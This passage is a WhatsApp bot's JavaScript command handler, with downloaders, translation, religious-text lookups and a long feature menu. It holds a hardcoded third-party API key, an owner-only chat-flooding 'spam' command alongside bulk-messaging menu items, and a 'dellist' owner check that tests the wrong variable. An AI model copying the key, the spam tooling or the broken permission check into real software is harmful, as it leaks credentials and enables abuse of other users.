  if (!text) return reply(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  try {
  	reply('*Please wait, generating image...*')
    const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await EliteProEmpire.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
    } else {
      throw '*Image generation failed*';
    }
  } catch {
    reply('*Oops! Something went wrong while generating images. Please try again later.*')
  }
  }
  break
  case 'translate':
  case  'trt': {
  	if (!q) return reply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} language id text*\n*${prefix + command} Hello dear how are you?*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* id text
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply(result.text)
    } catch (e) {
        return reply(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    reply(quranSurah)

    if (json.data.recitation.full) {
      EliteProEmpire.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
    break
case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return reply("This command is for group use only.")
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    EliteProEmpire.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'addlist':
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (!m.isGroup) return reply("This command is for group use only.")
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return reply(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
reply(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!EliteProEmpire) return reply("This command is only made for my owner.")
if (!m.isGroup) return reply("This command is for group use only.")
if (db_respon_list.length === 0) return reply(`There is no message list in the database yet`)
if (!q) return reply(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
reply(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
reply(teks)
}
break
case 'gimage':{
if (!text) return reply(`Usage: ${prefix}gimage elite-md github`);
EliteProEmpire.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let ini = await fetchJson(`https://aemt.me/googleimage?query=${q}`);
try{
for (let bing of ini.result) {
await sleep(500)
await EliteProEmpire.sendMessage(m.chat, { image: { url: bing }, caption: ``}, {quoted: m})
EliteProEmpire.sendMessage(m.chat, { react: { text: `☑️`, key: m.key }})
}
} catch (e) {
EliteProEmpire.sendMessage(m.chat, { react: { text: `✖️`, key: m.key }})
}
}
break
case'tozombie':{
if (!quoted) return reply(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Send/Reply Image With Caption ${prefix + command}`)
let q = m.quoted ? m.quoted : m
let media = await q.download()
let url = await uploadImage(media)
let anu = await fetch(`https://aemt.me/converter/zombie?url=${url}`)
let data = await anu.json()
await EliteProEmpire.sendMessage(m.chat, {image: {url: data.url}, caption: `Here u go!`}, {quoted: m})
}
break
case 'capcut':{
if (!text) return reply(`Enter the link\nExample\nhttps://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try{  
let anu = await fetchJson(`https://aemt.me/download/capcut?url=${text}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result.video_ori}, caption: `Here u go!`}, {quoted: m})
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break 
case 'smeme': case 'stickermeme': case 'stickmeme': {

if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return reply(`Usage: ${prefix + command} text1|text2`)
let { TelegraPh } = require('./lib/uploader.js')

atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await EliteProEmpire.downloadAndSaveMediaMessage(quoted)

mem = await TelegraPh(mee)

meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`

memek = await EliteProEmpire.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })


} else {
reply(`Send/reply image with caption ${prefix + command} text1|text2`)
}
}

break

case'smeta': {
if (!/webp/.test(mime)) return reply('Reply sticker!')
  var stiker = false
    try {
        let [packname, ...author] = q.split('|')
            //var author = (author  []).join('|')
                let mime = m.quoted.mimetype || ''
                        //let img = await q.download()
                            let img = await EliteProEmpire.downloadAndSaveMediaMessage(quoted, makeid(5))
                                if (!img) return reply('Reply a sticker!')
                                    var stiker = await addExifAvatar(img, `Made by`, `ElitePro`)
                                      } catch (e) {
                                          console.error(e)
                                              if (Buffer.isBuffer(e)) stiker = e
                                                } finally {
                                                    if (stiker) EliteProEmpire.sendMessage(m.chat, {
                                                          sticker: stiker
                                                              }, {
                                                                    quoted: m
                                                                        })
                                                                            else return reply('reply sticker')
                                                                              }
                                                                              }       
                                                                              break
case 'instagram2': case 'ig2':{
if (!text) return reply(`Enter the link!!!`)
if (!isUrl(args[0])) return reply(`Where is the link?`)
await EliteProEmpire.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try{   
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
EliteProEmpire.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `Here you go!` }, { quoted: m })
await EliteProEmpire.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})  
}catch (error) {
await EliteProEmpire.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
case 'itunes': {
if (!text) return reply('Please provide a song name')
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let songInfo = 
    `*Song Information:*\n
     • *Name:* ${json.name}\n
     • *Artist:* ${json.artist}\n
     • *Album:* ${json.album}\n
     • *Release Date:* ${json.release_date}\n
     • *Price:* ${json.price}\n
     • *Length:* ${json.length}\n
     • *Genre:* ${json.genre}\n
     • *URL:* ${json.url}`
    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      await EliteProEmpire.sendMessage(m.chat, {image: {url:json.thumbnail}, caption: songInfo}, {quoted: m})
    } else {
      reply(songInfo)
    }
  } catch (error) {
    console.error(error)
  }
}
break
case 'spam':
				if (!XeonTheCreator) return reply("This command is only made for my owner.")
					if (!text) return reply(`Use ${prefix +command} text|amount`)
				xeonarg = text.split("|")
				if (!xeonarg) return reply(`Use ${prefix+ command} text|amount`)
				if (Number(xeonarg[1]) >= 50) return reply('Max 50!')
				if (isNaN(xeonarg[1])) return reply(`must be a number`)
				for (let i = 0; i < xeonarg[1]; i++){
					EliteProEmpire.sendMessage(from, {text: xeonarg[0]})
				}
				break
case 'simisimi': case 'simi':
if (!text) reply('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
EliteProEmpire.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'clearall': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
EliteProEmpire.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'pinchat': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (m.isGroup) return reply("This command is made for private chat.")
EliteProEmpire.chatModify({ pin: true }, m.chat)
}
break
case 'unpinchat': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
if (m.isGroup) return reply("This command is made for private chat.")
EliteProEmpire.chatModify({ pin: false }, m.chat)
}
break
case 'database': {
if (!XeonTheCreator) return reply("This command is only made for my owner.")
totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    reply(`*${totalreg} users using Bot*`)
}
break 
case 'getjoinrequest':{
	if (!m.isGroup) return reply("This command is for group use only.")
	if (!isBotAdmins) return reply("Bot needs admin privileges.")
if (!isAdmins && !XeonTheCreator) return reply("This command is made for admins.")
	const response = await EliteProEmpire.groupRequestParticipantsList(m.chat);
  if (!response || !response.length) {
    EliteProEmpire.sendMessage(m.chat, {text: 'No pending join requests. ✅'}, {quoted:m});
    return;
  }
  let replyMessage = `${themeemoji} Join Request List:\n`;
  response.forEach((request, index) => {
    const { jid, request_method, request_time } = request;
    const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
    replyMessage += `\n*No.: ${index + 1} Request Details. 👇*`;
    replyMessage += `\n🧟‍♂️ *JID:* ${jid}`;
    replyMessage += `\n🧪 *Method:* ${request_method}`;
    replyMessage += `\n⏰ *Time:* ${formattedTime}\n`;
  });

  EliteProEmpire.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
};
break
case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
EliteProEmpire.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'xvideodl': case 'xvideosearch': case 'xvideo': case 'xvideos': case 'xvideosdl': {
	if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
  if (!text) return reply(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: ${prefix+command} hot japanese\nyou can use a link as well\nExample: ${prefix+command} link *`);
    if (!text) return reply('Please provide a search query or a valid Xvideos URL.');
    // Check if the input is a valid Xvideos URL
    const isURL = /^(https?:\/\/)?(www\.)?xvideos\.com\/.+$/i.test(text);
   try {
      if (isURL) {
        // If it's a valid URL, directly download the video
        const result = await xvideosdl(text);
        const { title, url } = result.result; 
        // Send the video file
        const response = await fetch(url);
        const buffer = await response.arrayBuffer();
        EliteProEmpire.sendMessage(
          m.chat,
          {video: Buffer.from(buffer),
          caption: `Here you go!!\nTitle: ${title}`} ); 
      } else {
        // If it's not a valid URL, perform a search and display the search results
        const results = await xvideosSearch(text);
        if (results.length === 0) {
          reply('No search results found for the given query.');
        } else {
          const searchResults = results.map((result, index) => {
            return `${index + 1}. *${result.title}*\nDuration: ${result.duration}\nQuality: ${result.quality}\nURL: ${result.url}`;
          }).join('\n\n');  
          reply(`*Search Results for "${text}":*\n\n${searchResults}`);
        }
      }
    } catch (error) {
      console.error(error);
      return reply('Failed to fetch Xvideos video details.');
    }
  };
  break
  case 'xnxxdl': case 'xnxx': case 'xnxxsearch': {
  if (!m.isGroup) return reply("This command is for group use only.")
	if (!AntiNsfw) return reply(mess.nsfw)
  if (!text)
    return reply(`What do you want to search?\nUsage: *${prefix + command} <search>*\n\nExample: Hot japanese\nor you can use a link as well\nExample: .${prefix + command} link *`)
  let url
  try {
    url = new URL(text)
  } catch (error) {
    url = null
  }
  if (url) {
    try {
      const files = await xnxxdl(url.href)
      if (files && files.high) {
        EliteProEmpire.sendMessage(m.chat, {video:{url: files.high}, caption: 'Here is go!!'}, {quoted:m})
      } else {
        reply('🔴 Error: Failed to retrieve the download URL.')
      }
    } catch (e) {
      console.error(e)
      reply('🔴 Error: We encountered a problem while processing the request.')
    }
  } else {
    try {
      const results = await xnxxSearch(text)
      if (results.length > 0) {
        const message = results.map((r, i) => `${i + 1}. [${r.title}](${r.link})`).join('\n')
        reply(message, null, {
          contextInfo: {
            mentionJid: EliteProEmpire.parseMention(message),
          },
        })
      } else {
        reply('🔴 Error: No search results found.')
      }
    } catch (e) {
      console.error(e)
      reply('🔴 Error: We encountered a problem while processing the request.')
    }
  }
}
break
case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    reply(gitaVerse)
    if (json.audio_link) {
      EliteProEmpire.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
case 'mega':{
	try {
if (!text) return reply(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return reply('Error: File size is too large (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Downloading file... Please wait.`;
        reply(downloadingMessage);
        const caption = `*_Successfully downloaded..._*\nFile: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await EliteProEmpire.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return reply(`Error: ${error.message}`);
    }
}
break
case 'diffusiob':{
if (!text) return reply('What do u want to make?')
    let myHeaders = new Headers();
    myHeaders.append("Content-Type", "application/json");
    let raw = JSON.stringify({
        "key": "TouFyL4VyhWWNhqC3DnF5hAdR2fLXxgGY4Gpe4BqC8YGKE2j4NjuNrJAXetE",
        "prompt": text,
        "negative_prompt": "ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers",
        "width": "720",
        "height": "720",
        "samples": "1",
        "num_inference_steps": "20",
        "seed": null,
        "guidance_scale": 7.5,
        "safety_checker": "yes",
        "multi_lingual": "no",
        "panorama": "no",
        "self_attention": "no",
        "upscale": "no",
        "embeddings_model": null,
        "webhook": null,
        "track_id": null
    });
    var requestOptions = {
        method: 'POST',
        headers: myHeaders,
        body: raw,
        redirect: 'follow'
    };
    try {
        let response = await fetch("https://stablediffusionapi.com/api/v3/text2img", requestOptions);
        let result = await response.json();
        EliteProEmpire.sendMessage(m.chat, { image: { url: result.output[0] }, caption: result.meta.prompt }, { quoted: m });
    } catch (error) {
        console.log('error', error);
        EliteProEmpire.sendMessage(m.chat, { image: { url: `${error.config.url}` }, caption: text }, { quoted: m });
    }
}
break
case 'indo-ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} halo`)
try {
let gpt = await (await fetch(`https://itzpire.site/ai/gpt-web?q=${text}`)).json()
reply("*[ Indo-Ai ]* " + '\n' + gpt.result)
 } catch(e) {
 return reply("`*Error*`")
}
}
break
case 'photoleap': {
	if (!text) return reply(`*• Example:* ${usedPrefix + command} blue sea`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return reply("Cooldown 10 seconds, try again later");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    EliteProEmpire.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: m});
  } catch(e) {
    return reply("`*Error*`");
  }
}
    break
case 'wikipedia': case 'wiki': {
	if (!text) return reply(` Enter what you want to search for on Wikipedia`)
	
    try {
	const link =  await axios.get(`https://en.wikipedia.org/wiki/${text}`)
	const $ = cheerio.load(link.data)
	let wik = $('#firstHeading').text().trim()
	let resulw = $('#mw-content-text > div.mw-parser-output').find('p').text().trim()
	reply(`▢ *Wikipedia*

‣ Title : ${wik}

${resulw}`)
} catch (e) {
  reply('⚠️ No results found ')
}
}
break
case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return reply("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return reply("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    await EliteProEmpire.sendMessage(m.chat, {video: {url: video}, caption: message},{quoted: m});
  } catch (error) {
    console.error("Error:", error);
    reply("*Error: Could not track the anime or send the video.*");
  }
};
break
case 'stickersearch': {
if (!text) return reply(`Example : ${m.prefix + command} kururmi`)
var js = await fetch(`https://dikaardnt.com/api/search/sticker?q=${q}`)
var json = await js.json()
reply(`
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}

💼 Title : ${json[0].title}
🔗 Link : ${json[0].url}
⭐ Total : ${json[0].total}
`);
}
break
case 'apksearch': {
if (!text) return reply(`Example : ${prefix + command} whatsapp`)
var js = await fetch(`https://dikaardnt.com/api/search/apk?q=${q}`)
var json = await js.json()
var capt = `
❗ Note : Bot Will Give Random Results. If the results do not match what you want, please type again ${prefix + command} ${text}
    
💼 Title : ${json[0].package}
🔗 Link : ${json[0].url}
👤 Develoepr : ${json[0].developer}
⭐ Rating : ${json[0].rating}
`;
await EliteProEmpire.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
case 'readmore': {
	let [l, r] = text.split`|`
    if (!l) l = ''
    if (!r) r = ''
    EliteProEmpire.sendMessage(m.chat, {text: l + readmore + r}, {quoted: m})
}
break;
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            reply(`Total Features of ${botname} is ${xeonfeature()}`)
        break
                    case 'menu':
            case 'help': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh2 = `╭━━━━━〘 *𝗘𝗟𝗜𝗧𝗘-𝗣𝗥𝗢-𝗩𝟮* 〙━━━┈⊷
┃❍╭──────────────
┃❍│ *ᴜꜱᴇʀ* : ${pushname}
┃❍│ *ᴍᴏᴅᴇ* : ${EliteProEmpire.public ? 'Public' : `Private`}
┃❍│ *ᴄᴏᴍᴍᴀɴᴅꜱ* : 1047
┃❍│ *ꜱᴘᴇᴇᴅ* : ${latensie.toFixed(4)}
┃❍│ *ʀᴀᴍ* : 25.02 GB/61.79 GB
┃❍│ *ᴘʟᴀᴛғᴏʀᴍ* : ${os.platform()}
┃❍╰──────────────
╰━━━━━━━━━━━━━━━━━━┈⊷
┊ *▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒*

${xeonytimewisher} 
${readmore}
*╭════════════════════⊷❍*`
let xmenu_oh = `╭━━━━━〘 *𝗘𝗟𝗜𝗧𝗘-𝗣𝗥𝗢-𝗩𝟮* 〙━━━┈⊷
┃❍╭──────────────
┃❍│ *ᴜꜱᴇʀ* : ${pushname}
┃❍│ *ᴍᴏᴅᴇ* : ${EliteProEmpire.public ? 'Public' : `Private`}
┃❍│ *ᴄᴏᴍᴍᴀɴᴅꜱ* : 1047
┃❍│ *ꜱᴘᴇᴇᴅ* : ${latensie.toFixed(4)}
┃❍│ *ʀᴀᴍ* : 25.02 GB/61.79 GB
┃❍│ *ᴘʟᴀᴛғᴏʀᴍ* : ${os.platform()}
┃❍╰──────────────
╰━━━━━━━━━━━━━━━━━━┈⊷
┊ *▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒*

${xeonytimewisher} 
${readmore}
*╭════════════════════⊷❍*
*╭────❍* Owner Menu *❍*
*││◦➛* ${prefix}autoread
*││◦➛* ${prefix}autobio
*││◦➛* ${prefix}autoreact 
*││◦➛* ${prefix}autotype
*││◦➛* ${prefix}getpp
*││◦➛* ${prefix}pair
*││◦➛* ${prefix}unavailable
*││◦➛* ${prefix}autorecord
*││◦➛* ${prefix}autorecordtype
*││◦➛* ${prefix}autoswview
*││◦➛* ${prefix}setautoblock
*││◦➛* ${prefix}setantiforeign
*││◦➛* ${prefix}autoblock
*││◦➛* ${prefix}onlygc
*││◦➛* ${prefix}onlypc
*││◦➛* ${prefix}onlyindia
*││◦➛* ${prefix}onlyindo
*││◦➛* ${prefix}anticall
*││◦➛* ${prefix}private
*││◦➛* ${prefix}public
*││◦➛* ${prefix}join
*││◦➛* ${prefix}poll
*││◦➛* ${prefix}spam
*││◦➛* ${prefix}bc
*││◦➛* ${prefix}bcgroup
*││◦➛* ${prefix}setmenu
*││◦➛* ${prefix}setimgmenu
*││◦➛* ${prefix}setvidmenu
*││◦➛* ${prefix}setgifmenu
*││◦➛* ${prefix}setreply
*││◦➛* ${prefix}setprefix
*││◦➛* ${prefix}addlimit
*││◦➛* ${prefix}dellimit
*││◦➛* ${prefix}resethit
*││◦➛* ${prefix}resetuser
*││◦➛* ${prefix}creategc
*││◦➛* ${prefix}setexif
*││◦➛* ${prefix}userjid
*││◦➛* ${prefix}setbotbio
*││◦➛* ${prefix}delppbot
*││◦➛* ${prefix}restart
*││◦➛* ${prefix}setppbot
*││◦➛* ${prefix}addprem
*││◦➛* ${prefix}delprem
*││◦➛* ${prefix}addowner
*││◦➛* ${prefix}delowner
*││◦➛* ${prefix}addvn
*││◦➛* ${prefix}addapk
*││◦➛* ${prefix}addzip
*││◦➛* ${prefix}addpdf
*││◦➛* ${prefix}delapk
*││◦➛* ${prefix}delzip
*││◦➛* ${prefix}delpdf
*││◦➛* ${prefix}delvn
*││◦➛* ${prefix}addsticker
*││◦➛* ${prefix}delsticker
*││◦➛* ${prefix}addimage
*││◦➛* ${prefix}delimage
*││◦➛* ${prefix}addvideo
*││◦➛* ${prefix}delvideo
*││◦➛* ${prefix}addtitle
*││◦➛* ${prefix}deltitle
*││◦➛* ${prefix}upswtext
*││◦➛* ${prefix}upswvideo
*││◦➛* ${prefix}upswimage
*││◦➛* ${prefix}upswaudio
*││◦➛* ${prefix}autosticker
*││◦➛* ${prefix}block
*││◦➛* ${prefix}unblock
*││◦➛* ${prefix}leavegc
*││◦➛* ${prefix}pushcontact
*││◦➛* ${prefix}pushcontactv2
*││◦➛* ${prefix}pushcontactv3
*││◦➛* ${prefix}jpm
*││◦➛* ${prefix}post
*││◦➛* ${prefix}clearall
*││◦➛* ${prefix}pinchat
*││◦➛* ${prefix}unpinchat
*╰═════════════❍*

*╭────❍* Tutorials *❍*
*││◦➛* ${prefix}deploy
*││◦➛* ${prefix}panel
*╰═════════════❍*

*╭────❍* Group Menu *❍*
*││◦➛* ${prefix}antibot
*││◦➛* ${prefix}antiviewonce
*││◦➛* ${prefix}vv
*││◦➛* ${prefix}welcome
*││◦➛* ${prefix}adminevent
*││◦➛* ${prefix}groupevent
*││◦➛* ${prefix}antiforeign
*││◦➛* ${prefix}antimedia
*││◦➛* ${prefix}antiaudio
*││◦➛* ${prefix}antivideo
*││◦➛* ${prefix}antiimage
*││◦➛* ${prefix}antidocument
*││◦➛* ${prefix}antilocation
*││◦➛* ${prefix}anticontact
*││◦➛* ${prefix}antisticker
*││◦➛* ${prefix}antipoll
*││◦➛* ${prefix}antilink
*││◦➛* ${prefix}antilinkgc
*││◦➛* ${prefix}antipromotion
*││◦➛* ${prefix}antivirtex
*││◦➛* ${prefix}grouplink
*││◦➛* ${prefix}listadmin
*││◦➛* ${prefix}invite
*││◦➛* ${prefix}ephemeral
*││◦➛* ${prefix}delete
*││◦➛* ${prefix}setppgroup
*││◦➛* ${prefix}delppgroup
*││◦➛* ${prefix}setnamegc
*││◦➛* ${prefix}setdesc
*││◦➛* ${prefix}add
*││◦➛* ${prefix}kick
*││◦➛* ${prefix}promote
*││◦➛* ${prefix}demote
*││◦➛* ${prefix}kickall
*││◦➛* ${prefix}promoteall
*││◦➛* ${prefix}demoteall
*││◦➛* ${prefix}getcontact
*││◦➛* ${prefix}savecontact
*││◦➛* ${prefix}sendcontact
*││◦➛* ${prefix}contactag
*││◦➛* ${prefix}hidetag
*││◦➛* ${prefix}totag
*││◦➛* ${prefix}tagall
*││◦➛* ${prefix}editinfo
*││◦➛* ${prefix}opentime
*││◦➛* ${prefix}closetime
*││◦➛* ${prefix}resetlink
*││◦➛* ${prefix}getbio
*││◦➛* ${prefix}vote
*││◦➛* ${prefix}upvote
*││◦➛* ${prefix}downvote
*││◦➛* ${prefix}checkvote
*││◦➛* ${prefix}delvote
*││◦➛* ${prefix}antivirus
*││◦➛* ${prefix}antitoxic
*││◦➛* ${prefix}nsfw
*││◦➛* ${prefix}react
*││◦➛* ${prefix}getjoinrequest
*╰═════════════❍*

*╭────❍* Search *❍*
*││◦➛* ${prefix}google
*││◦➛* ${prefix}wikipedia
*││◦➛* ${prefix}ytsearch
*││◦➛* ${prefix}xnxxsearch
*││◦➛* ${prefix}xvideosearch
*││◦➛* ${prefix}apksearch
*││◦➛* ${prefix}stickersearch
